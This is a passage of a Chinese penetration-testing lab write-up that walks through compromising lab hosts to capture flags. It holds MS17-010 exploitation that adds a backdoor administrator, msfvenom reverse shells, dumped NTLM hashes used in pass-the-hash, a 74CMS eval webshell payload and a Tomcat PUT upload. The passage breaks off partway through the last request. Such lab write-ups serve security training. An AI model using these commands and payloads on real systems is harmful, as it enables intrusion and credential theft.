+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p><strong>内网信息收集</strong></p>
+<p>外网机器是双网卡，目标内网还有一个 192.168.20.X 网段</p>
+<p><figure>
+  <img src="image-20250302190303722.png" alt="image-20250302190303722" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250303105119541.png" alt="image-20250303105119541" loading="lazy"></figure>
+</p>
+<p><strong>Fscan 扫描</strong></p>
+<p>使用 fscan 对 20 段进行扫描</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">fscan.exe -h 192.168.20.0/24</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>发现 20 和 30 都有永恒之蓝漏洞</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">192.168.20.20:139 open
+</span></span><span class="line"><span class="cl">192.168.20.10:139 open
+</span></span><span class="line"><span class="cl">192.168.20.10:3306 open
+</span></span><span class="line"><span class="cl">192.168.20.30:445 open
+</span></span><span class="line"><span class="cl">192.168.20.20:445 open
+</span></span><span class="line"><span class="cl">192.168.20.10:445 open
+</span></span><span class="line"><span class="cl">192.168.20.30:139 open
+</span></span><span class="line"><span class="cl">192.168.20.30:135 open
+</span></span><span class="line"><span class="cl">192.168.20.20:135 open
+</span></span><span class="line"><span class="cl">192.168.20.10:80 open
+</span></span><span class="line"><span class="cl">192.168.20.30:88 open
+</span></span><span class="line"><span class="cl">192.168.20.10:135 open
+</span></span><span class="line"><span class="cl">[*] NetBios 192.168.20.20   cyberweb.CSLab.com         Windows Server 2012 R2 Standard 9600
+</span></span><span class="line"><span class="cl">[*] NetBios 192.168.20.10   WORKGROUP\WIN-KOHRC1DGOL9           Windows Server 2012 R2 Standard 9600
+</span></span><span class="line"><span class="cl">[*] NetInfo 
+</span></span><span class="line"><span class="cl">[*]192.168.20.20
+</span></span><span class="line"><span class="cl">   [-&gt;]cyberweb
+</span></span><span class="line"><span class="cl">   [-&gt;]192.168.20.20
+</span></span><span class="line"><span class="cl">[*] NetInfo 
+</span></span><span class="line"><span class="cl">[*]192.168.20.30
+</span></span><span class="line"><span class="cl">   [-&gt;]WIN-7NRTJO59O7N
+</span></span><span class="line"><span class="cl">   [-&gt;]192.168.20.30
+</span></span><span class="line"><span class="cl">[+] MS17-010 192.168.20.20	(Windows Server 2012 R2 Standard 9600)
+</span></span><span class="line"><span class="cl">[+] MS17-010 192.168.20.30	(Windows Server 2008 R2 Standard 7600)
+</span></span><span class="line"><span class="cl">[*] WebTitle http://192.168.20.10      code:200 len:25229  title:易优CMS -  Powered by Eyoucms.com
+</span></span><span class="line"><span class="cl">[+] PocScan http://192.168.20.10 poc-yaml-thinkphp5023-method-rce poc1</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><h3 class="heading-element" id="域控---1921682030"><span>域控 - 192.168.20.30</span>
+  <a href="#%e5%9f%9f%e6%8e%a7---1921682030" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><strong>CS 派发 MSF 会话</strong>，先开启MSF</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl">set payload windows/meterpreter/reverse_http
+</span></span><span class="line"><span class="cl">set LHOST 172.16.233.2
+</span></span><span class="line"><span class="cl">set LPORT 4777
+</span></span><span class="line"><span class="cl">run</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>CS 启动监听，配置与 MSF 一致</p>
+<p><figure>
+  <img src="image-20250303122413992.png" alt="image-20250303122413992" loading="lazy"></figure>
+</p>
+<p>选择 192.168.10.10 会话，spawn 选择刚配置的监听，点击 Choose，MSF 成功接收到 CS 的会话</p>
+<p><figure>
+  <img src="image-20250303122832054.png" alt="image-20250303122832054" loading="lazy"></figure>
+</p>
+<p>MSF 配置路由</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">run autoroute -s 192.168.20.0/24
+</span></span><span class="line"><span class="cl">run autoroute -p  //观测路由是否添加成功</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250303123219982.png" alt="image-20250303123219982" loading="lazy"></figure>
+</p>
+<p>MSF 设置 Socks 代理</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">search socks || use auxiliary/server/socks_proxy
+</span></span><span class="line"><span class="cl">set SRVHOST 172.16.233.2
+</span></span><span class="line"><span class="cl">run
+</span></span><span class="line"><span class="cl">sudo vi /etc/proxychains4.conf  //修改配置文件和选项设置的一致，且注意sock4、sock5一致</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250303123310096.png" alt="image-20250303123310096" loading="lazy"></figure>
+</p>
+<p>永恒之蓝漏洞利用，尝试模块，发现 ms17_010_command 能够被利用</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">search ms17_010
+</span></span><span class="line"><span class="cl">use 19
+</span></span><span class="line"><span class="cl">set COMMAND whoami
+</span></span><span class="line"><span class="cl">set RHOSTS 172.16.233.2
+</span></span><span class="line"><span class="cl">run</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250303123725242.png" alt="image-20250303123725242" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">set COMMAND &#39;dir C:\&#39;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250303123932158.png" alt="image-20250303123932158" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">set COMMAND &#39;type C:\flag.txt&#39;
+</span></span><span class="line"><span class="cl">run</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>拿到第二个旗帜</p>
+<p><figure>
+  <img src="image-20250303124022556.png" alt="image-20250303124022556" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">set COMMAND &#39;net user abcc 123@abc /add&#39;
+</span></span><span class="line"><span class="cl">set COMMAND &#39;net localgroup Administrators abcc /add&#39;
+</span></span><span class="line"><span class="cl">set COMMAND &#39;REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&#34; &#34;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f&#39;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250303124059122.png" alt="image-20250303124059122" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250303124302763.png" alt="image-20250303124302763" loading="lazy"></figure>
+</p>
+<p>远程桌面连接</p>
+<p><figure>
+  <img src="image-20250303124355986.png" alt="image-20250303124355986" loading="lazy"></figure>
+</p>
+<p>.\用户名 登录，成功登录</p>
+<p><figure>
+  <img src="image-20250303154731381.png" alt="image-20250303154731381" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250303162638253.png" alt="image-20250303162638253" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="域成员---1921682020"><span>域成员 - 192.168.20.20</span>
+  <a href="#%e5%9f%9f%e6%88%90%e5%91%98---1921682020" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>这台机器同样爆出了永恒之蓝，但一直利用失败，不过因为我们已经拿下域控制器，所以可以换一种方式，去拿域控制器的 hash，对域成员做 PTH 攻击</p>
+<p>上线 MSF</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">use exploit/multi/handler
+</span></span><span class="line"><span class="cl">set payload windows/x64/meterpreter/reverse_tcp
+</span></span><span class="line"><span class="cl">set lhost 192.168.20.10
+</span></span><span class="line"><span class="cl">set lport 23231
+</span></span><span class="line"><span class="cl">run</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.208.138 LPORT=6666 -f exe &gt; reverse.exe</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>制作木马并上传，上传稍麻烦，因为隧道搭在 MSF，因此选择将木马上传到 192.168.10.10 主机上，通过 phpstudy 自带 php 开启 Web 服务，再通过 192.168.20.30 浏览器下载文件</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">php.exe -S 0.0.0.0:22222</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>访问并保存，运行即可</p>
+<p><figure>
+  <img src="image-20250303165436865.png" alt="image-20250303165436865" loading="lazy"></figure>
+</p>
+<p>运行时注意管理员身份运行</p>
+<p><figure>
+  <img src="image-20250303173105964.png" alt="image-20250303173105964" loading="lazy"></figure>
+</p>
+<p><figure>
+  <img src="image-20250303165555703.png" alt="image-20250303165555703" loading="lazy"></figure>
+</p>
+<p>获取 hash</p>
+<p><figure>
+  <img src="image-20250303173046901.png" alt="image-20250303173046901" loading="lazy"></figure>
+</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">Administrator:500:aad3b435b51404eeaad3b435b51404ee:94bd5248e87cb7f2f9b871d40c903927:::
+</span></span><span class="line"><span class="cl">Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
+</span></span><span class="line"><span class="cl">krbtgt:502:aad3b435b51404eeaad3b435b51404ee:5bc02b7670084dd30471730cc0a1672c:::
+</span></span><span class="line"><span class="cl">cyberweb:1105:aad3b435b51404eeaad3b435b51404ee:2de5cd0f15d1c070851d1044e1d95c90:::
+</span></span><span class="line"><span class="cl">abcc:1106:aad3b435b51404eeaad3b435b51404ee:73f5d97549f033374fa6d9f9ce247ffd:::
+</span></span><span class="line"><span class="cl">WIN-7NRTJO59O7N$:1000:aad3b435b51404eeaad3b435b51404ee:a0cde4eb68e4a2345b888c83eed3b196:::
+</span></span><span class="line"><span class="cl">CYBERWEB$:1103:aad3b435b51404eeaad3b435b51404ee:fba62b6152431813b79b5e71c41b16d0:::</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">proxychains4 -q python3 psexec.py -hashes :94bd5248e87cb7f2f9b871d40c903927 CSLab.com/administrator@192.168.20.20</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250303173617800.png" alt="image-20250303173617800" loading="lazy"></figure>
+</p>
+<p>拿到最后的旗帜</p>
+<p><figure>
+  <img src="image-20250303173712105.png" alt="image-20250303173712105" loading="lazy"></figure>
+</p>
+<h1 class="heading-element" id="lab2"><span>Lab2</span>
+  <a href="#lab2" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h1><p><strong>难度: 简单</strong></p>
+<p>目标：公司派遣测试某网络的安全性。目标是成功获取所有服务器的权限，以评估网络安全状况。</p>
+<p><strong>漏洞扫描：</strong></p>
+<p>对 192.168.10.* 网段进行扫描，发现 192.168.10.20 可能存在 CVE-2017-12615 历史漏洞，以及 192.168.10.10 74 CMS</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">[+] PocScan http://192.168.10.20:8080 poc-yaml-iis-put-getshell
+</span></span><span class="line"><span class="cl">[+] PocScan http://192.168.10.20:8080 poc-yaml-tomcat-cve-2017-12615-rce</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250307210505387.png" alt="image-20250307210505387" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="独立工作站---1921681010"><span>独立工作站 - 192.168.10.10</span>
+  <a href="#%e7%8b%ac%e7%ab%8b%e5%b7%a5%e4%bd%9c%e7%ab%99---1921681010" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><p>骑士CMS 渗透，我对 808 端口进行目录扫描，扫描的同时对 Web 页面进行初步观测，尝试寻找 SQL 注入、SSRF 等常规 Web 漏洞，可惜并没有发现有效入口点</p>
+<p><figure>
+  <img src="image-20250306211540734.png" alt="image-20250306211540734" loading="lazy"></figure>
+</p>
+<p>常规字典下扫描也没有发现特别信息</p>
+<p><figure>
+  <img src="image-20250307142941715.png" alt="image-20250307142941715" loading="lazy"></figure>
+</p>
+<p>渗透并不顺利，我转而在网络检索尝试找到更多线索，在某个官方文档中发现了该 CMS 的通用管理员页面路径</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/index.php?m=admin&amp;c=index&amp;a=login</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250307141020560.png" alt="image-20250307141020560" loading="lazy"></figure>
+</p>
+<h3 class="heading-element" id="弱口令爆破"><span>弱口令/爆破</span>
+  <a href="#%e5%bc%b1%e5%8f%a3%e4%bb%a4%e7%88%86%e7%a0%b4" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p>直接输入错误账户名，会回显管理员账号不存在，这使得很顺利地测试出管理员账号名 admin</p>
+<p><figure>
+  <img src="image-20250307143442587.png" alt="image-20250307143442587" loading="lazy"></figure>
+</p>
+<p>简单测试一下密码就出来了，靶机并没有在这方面上难为人</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">admin/admin123456</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p><figure>
+  <img src="image-20250307151058967.png" alt="image-20250307151058967" loading="lazy"></figure>
+</p>
+<p>进入后台，我发现了目标 74 CMS 版本为 v4.2.111，依此找到了其历史漏洞后台 GetShell</p>
+<p><figure>
+  <img src="image-20250307151527383.png" alt="image-20250307151527383" loading="lazy"></figure>
+</p>
+<p>依次点击工具、风格模板、可用模板并抓包</p>
+<p><figure>
+  <img src="image-20250307155645472.png" alt="image-20250307155645472" loading="lazy"></figure>
+</p>
+<p>tpl_dir 改为如下 Payload</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">tpl_dir=&#39;,&#39;a&#39;,eval($_POST[&#39;cmd&#39;]),&#39;</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>随后访问路径</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="1" style="--fi-max-shown-lines:30;--fi-line-digit:1;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">/Application/Home/Conf/config.php
+</span></span><span class="line"><span class="cl">cmd=system(&#39;whoami&#39;);</span></span></code></pre></div><div class="code-copy-btn" aria-label="Copy to clipboard" role="button" title="Copy to clipboard"><i class="fa-regular fa-clone fa-width-auto" aria-hidden="true"></i></div></div><p>命令执行成功，直接拿到了 system 权限</p>
+<p><figure>
+  <img src="image-20250307163324333.png" alt="image-20250307163324333" loading="lazy"></figure>
+</p>
+<p>使用 certitul 下载文件并上线 CS</p>
+<p><figure>
+  <img src="image-20250307164857995.png" alt="image-20250307164857995" loading="lazy"></figure>
+</p>
+<p>拿到第一个旗帜</p>
+<p><figure>
+  <img src="image-20250307165947758.png" alt="image-20250307165947758" loading="lazy"></figure>
+</p>
+<h2 class="heading-element" id="域边界突破---1921681020"><span>域边界突破 - 192.168.10.20</span>
+  <a href="#%e5%9f%9f%e8%be%b9%e7%95%8c%e7%aa%81%e7%a0%b4---1921681020" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h2><h3 class="heading-element" id="tomcat-任意文件写入"><span>Tomcat 任意文件写入</span>
+  <a href="#tomcat-%e4%bb%bb%e6%84%8f%e6%96%87%e4%bb%b6%e5%86%99%e5%85%a5" class="heading-mark">
+    <svg class="octicon octicon-link" viewBox="0 0 16 16" version="1.1" width="16" height="16" aria-hidden="true"><path d="m7.775 3.275 1.25-1.25a3.5 3.5 0 1 1 4.95 4.95l-2.5 2.5a3.5 3.5 0 0 1-4.95 0 .751.751 0 0 1 .018-1.042.751.751 0 0 1 1.042-.018 1.998 1.998 0 0 0 2.83 0l2.5-2.5a2.002 2.002 0 0 0-2.83-2.83l-1.25 1.25a.751.751 0 0 1-1.042-.018.751.751 0 0 1-.018-1.042Zm-4.69 9.64a1.998 1.998 0 0 0 2.83 0l1.25-1.25a.751.751 0 0 1 1.042.018.751.751 0 0 1 .018 1.042l-1.25 1.25a3.5 3.5 0 1 1-4.95-4.95l2.5-2.5a3.5 3.5 0 0 1 4.95 0 .751.751 0 0 1-.018 1.042.751.751 0 0 1-1.042.018 1.998 1.998 0 0 0-2.83 0l-2.5 2.5a1.998 1.998 0 0 0 0 2.83Z"></path></svg>
+  </a>
+</h3><p><figure>
+  <img src="image-20250307220024288.png" alt="image-20250307220024288" loading="lazy"></figure>
+</p>
+<p>接下来对 192.168.10.20 已经发现的 Nday 进行利用，手工抓包上传，Payload 如下</p>
+<div class="code-block highlight line-nos-hidden" data-mode="simple" data-copyable="true"><div class="code-wrapper" data-max="30" data-line-digit="2" style="--fi-max-shown-lines:30;--fi-line-digit:2;--fi-line-start:1;"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">PUT /1.jsp/ HTTP/1.1
+</span></span><span class="line"><span class="cl">Host: 192.168.10.20:8080
+</span></span><span class="line"><span class="cl">User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> Win64<span class="p">;</span> x64<span class="p">;</span> rv:136.0<span class="o">)</span> Gecko/20100101 Firefox/136.0
